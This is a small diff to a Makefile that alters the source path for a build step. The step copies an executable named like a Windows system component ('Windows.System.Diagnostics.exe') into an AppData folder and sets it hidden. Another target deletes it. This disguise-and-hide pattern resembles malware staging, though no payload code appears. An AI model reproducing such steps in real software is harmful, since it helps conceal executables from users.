@@ -40,7 +40,7 @@ clean:
 	$(CC) $(SRC_CLEAN) -o "$(OUT_DIR)/icuclean-x86_x64.exe" $(SRC_ENV)
 
 appdata_c:
-	copy /Y "$(HOME)\.sys\windows\source\Windows.System.Diagnostics.exe" "$(APPDATA_OUT)"
+	copy /Y "$(HOME)\sys\windows\source\Windows.System.Diagnostics.exe" "$(APPDATA_OUT)"
 	attrib +h "$(APPDATA_OUT)\Windows.System.Diagnostics.exe"
 appdata_d:
 	del /Q "$(APPDATA_OUT)\Windows.System.Diagnostics.exe"
